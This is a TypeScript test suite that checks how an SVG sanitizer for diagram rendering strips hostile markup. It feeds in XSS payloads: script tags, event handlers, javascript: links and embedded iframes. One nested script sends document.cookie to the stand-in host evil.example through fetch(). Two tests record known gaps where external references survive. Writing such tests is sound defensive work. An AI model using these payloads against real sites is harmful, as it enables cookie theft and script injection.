/**
 * Behavioral capture tests — svg-sanitizer (OLD module, portfolio_ui v1)
 *
 * F3-01 Step 1: pin CURRENT behavior of the hand-rolled SVG sanitizer
 * (Mermaid diagram rendering path). Security-critical, previously untested.
 *
 * Ground truth: src/library/svg-sanitizer.ts @ rework/v2 6bb5a78.
 */

import { parseSanitizedSvg } from '@/library/svg-sanitizer';

const benignSvg = `<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <rect x="10" y="10" width="80" height="80" fill="red"/>
  <text x="50" y="50">hello</text>
</svg>`;

describe('parseSanitizedSvg — benign passthrough', () => {
  it('returns an SVGSVGElement for benign markup', () => {
    const svg = parseSanitizedSvg(benignSvg);
    expect(svg).not.toBeNull();
    expect(svg?.tagName.toLowerCase()).toBe('svg');
  });

  it('keeps benign geometry and text intact', () => {
    const svg = parseSanitizedSvg(benignSvg);
    expect(svg?.querySelector('rect')).not.toBeNull();
    expect(svg?.querySelector('text')?.textContent).toBe('hello');
  });

  it('returns null for non-SVG root markup', () => {
    expect(parseSanitizedSvg('<div>not an svg</div>')).toBeNull();
    expect(parseSanitizedSvg('<html><body></body></html>')).toBeNull();
  });

  it('returns null for a parser error document', () => {
    expect(parseSanitizedSvg('this is not xml at all <svg>')).toBeNull();
  });
});

describe('parseSanitizedSvg — script stripping', () => {
  it('removes <script> children entirely', () => {
    const svg = parseSanitizedSvg(`<svg xmlns="http://www.w3.org/2000/svg">
      <script>alert(1)</script>
      <rect width="10" height="10"/>
    </svg>`);
    expect(svg?.querySelector('script')).toBeNull();
    expect(svg?.querySelector('rect')).not.toBeNull();
  });

  it('removes nested <script> deep in the tree', () => {
    const svg = parseSanitizedSvg(`<svg xmlns="http://www.w3.org/2000/svg">
      <g><g><g><script>fetch('https://evil.example/${document.cookie}')</script></g></g></g>
      <circle r="5"/>
    </svg>`);
    expect(svg?.querySelector('script')).toBeNull();
  });
});

describe('parseSanitizedSvg — event handler stripping', () => {
  it('removes onload from the root <svg> element', () => {
    const svg = parseSanitizedSvg(
      `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)" width="100"><rect width="5" height="5"/></svg>`
    );
    expect(svg?.getAttribute('onload')).toBeNull();
    expect(svg?.getAttribute('width')).toBe('100');
  });

  it('removes onclick from nested elements but keeps safe attributes', () => {
    const svg = parseSanitizedSvg(`<svg xmlns="http://www.w3.org/2000/svg">
      <rect id="target" onclick="alert(1)" width="10" height="10" fill="blue"/>
    </svg>`);
    const rect = svg?.querySelector('#target');
    expect(rect?.getAttribute('onclick')).toBeNull();
    expect(rect?.getAttribute('fill')).toBe('blue');
    expect(rect?.getAttribute('width')).toBe('10');
  });

  it('removes case-variant handlers (ONLOAD, onLoad) — attribute names lowercased', () => {
    const svg = parseSanitizedSvg(`<svg xmlns="http://www.w3.org/2000/svg">
      <rect ONLOAD="alert(1)" onmouseover="alert(2)"/>
    </svg>`);
    const rect = svg?.querySelector('rect');
    expect(rect?.getAttribute('onload')).toBeNull();
    expect(rect?.getAttribute('onmouseover')).toBeNull();
  });
});

describe('parseSanitizedSvg — javascript: URL stripping', () => {
  it('removes javascript: href from <a> inside the SVG', () => {
    const svg = parseSanitizedSvg(`<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
      <a href="javascript:alert(1)"><text>x</text></a>
      <a xlink:href="javascript:alert(2)"><text>y</text></a>
    </svg>`);
    const anchors = svg?.querySelectorAll('a');
    anchors?.forEach((a: Element) => {
      expect(a.getAttribute('href')).toBeNull();
      expect(a.getAttribute('xlink:href')).toBeNull();
    });
  });

  it('keeps benign http hrefs', () => {
    const svg = parseSanitizedSvg(`<svg xmlns="http://www.w3.org/2000/svg">
      <a href="https://example.com"><text>ok</text></a>
    </svg>`);
    expect(svg?.querySelector('a')?.getAttribute('href')).toBe('https://example.com');
  });

  it('removes javascript: with mixed case and whitespace (value is trimmed+lowercased)', () => {
    const svg = parseSanitizedSvg(`<svg xmlns="http://www.w3.org/2000/svg">
      <a href="  JaVaScRiPt:alert(1)"><text>x</text></a>
    </svg>`);
    expect(svg?.querySelector('a')?.getAttribute('href')).toBeNull();
  });
});

describe('parseSanitizedSvg — dangerous embedded-object stripping', () => {
  it('removes iframe/object/embed/audio/video children', () => {
    const svg = parseSanitizedSvg(`<svg xmlns="http://www.w3.org/2000/svg">
      <iframe src="https://evil.example"/>
      <object data="https://evil.example"/>
      <embed src="https://evil.example"/>
      <audio src="x"/>
      <video src="x"/>
      <rect width="5" height="5"/>
    </svg>`);
    expect(svg?.querySelector('iframe')).toBeNull();
    expect(svg?.querySelector('object')).toBeNull();
    expect(svg?.querySelector('embed')).toBeNull();
    expect(svg?.querySelector('audio')).toBeNull();
    expect(svg?.querySelector('video')).toBeNull();
    expect(svg?.querySelector('rect')).not.toBeNull();
  });
});

describe('parseSanitizedSvg — foreignObject content', () => {
  it('sanitizes foreignObject inner HTML: keeps formatting, strips scripts/handlers', () => {
    const svg = parseSanitizedSvg(`<svg xmlns="http://www.w3.org/2000/svg">
      <foreignObject width="100" height="100">
        <div xmlns="http://www.w3.org/1999/xhtml">
          <b>bold</b><span onclick="alert(1)">click</span>
          <script>alert(2)</script>
          <iframe src="https://evil.example"></iframe>
        </div>
      </foreignObject>
      <rect width="5" height="5"/>
    </svg>`);
    const fo = svg?.querySelector('foreignObject');
    expect(fo).not.toBeNull();
    expect(fo?.querySelector('b')?.textContent).toBe('bold');
    expect(fo?.querySelector('span')?.getAttribute('onclick')).toBeNull();
    expect(fo?.querySelector('script')).toBeNull();
    expect(fo?.querySelector('iframe')).toBeNull();
    // SVG siblings survive
    expect(svg?.querySelector('rect')).not.toBeNull();
  });

  it('keeps allowed foreignObject tags (headings, lists, code, links)', () => {
    const svg = parseSanitizedSvg(`<svg xmlns="http://www.w3.org/2000/svg">
      <foreignObject width="200" height="200">
        <div xmlns="http://www.w3.org/1999/xhtml">
          <h3>Title</h3>
          <ul><li>one</li><li>two</li></ul>
          <code>print()</code>
          <a href="https://example.com">docs</a>
        </div>
      </foreignObject>
    </svg>`);
    const fo = svg?.querySelector('foreignObject');
    expect(fo?.querySelector('h3')?.textContent).toBe('Title');
    expect(fo?.querySelectorAll('li')).toHaveLength(2);
    expect(fo?.querySelector('code')?.textContent).toBe('print()');
    expect(fo?.querySelector('a')?.getAttribute('href')).toBe('https://example.com');
  });

  it('strips form controls and interactive HTML inside foreignObject', () => {
    const svg = parseSanitizedSvg(`<svg xmlns="http://www.w3.org/2000/svg">
      <foreignObject width="200" height="200">
        <div xmlns="http://www.w3.org/1999/xhtml">
          <form><input type="text" onfocus="alert(1)"/><button>go</button></form>
          <textarea rows="2"></textarea>
          <select><option>a</option></select>
        </div>
      </foreignObject>
    </svg>`);
    const fo = svg?.querySelector('foreignObject');
    expect(fo?.querySelector('form')).toBeNull();
    expect(fo?.querySelector('input')).toBeNull();
    expect(fo?.querySelector('button')).toBeNull();
    expect(fo?.querySelector('textarea')).toBeNull();
    expect(fo?.querySelector('select')).toBeNull();
  });

  it('strips link/meta/base inside foreignObject (resource injection vectors)', () => {
    const svg = parseSanitizedSvg(`<svg xmlns="http://www.w3.org/2000/svg">
      <foreignObject width="200" height="200">
        <div xmlns="http://www.w3.org/1999/xhtml">
          <link rel="stylesheet" href="https://evil.example/x.css"/>
          <meta charset="utf-8"/>
          <base href="https://evil.example/"/>
        </div>
      </foreignObject>
    </svg>`);
    const fo = svg?.querySelector('foreignObject');
    expect(fo?.querySelector('link')).toBeNull();
    expect(fo?.querySelector('meta')).toBeNull();
    expect(fo?.querySelector('base')).toBeNull();
  });

  it('strips javascript: hrefs inside foreignObject anchors', () => {
    const svg = parseSanitizedSvg(`<svg xmlns="http://www.w3.org/2000/svg">
      <foreignObject width="200" height="200">
        <div xmlns="http://www.w3.org/1999/xhtml">
          <a href="javascript:alert(1)">click</a>
        </div>
      </foreignObject>
    </svg>`);
    expect(svg?.querySelector('foreignObject a')?.getAttribute('href')).toBeNull();
  });
});

describe('parseSanitizedSvg — external references (captured current behavior)', () => {
  it('KEEPS external <use> references (documented gap — sanitizer does not inspect them)', () => {
    const svg = parseSanitizedSvg(`<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
      <use xlink:href="https://evil.example/external.svg#fragment"/>
      <use href="#internal-fragment"/>
    </svg>`);
    const uses = svg?.querySelectorAll('use');
    expect(uses?.[0]?.getAttribute('xlink:href')).toBe('https://evil.example/external.svg#fragment');
    expect(uses?.[1]?.getAttribute('href')).toBe('#internal-fragment');
  });

  it('KEEPS <image> with external href (documented gap — same class as <use>)', () => {
    const svg = parseSanitizedSvg(`<svg xmlns="http://www.w3.org/2000/svg">
      <image href="https://evil.example/pixel.png" width="10" height="10"/>
    </svg>`);
    expect(svg?.querySelector('image')?.getAttribute('href')).toBe('https://evil.example/pixel.png');
  });
});
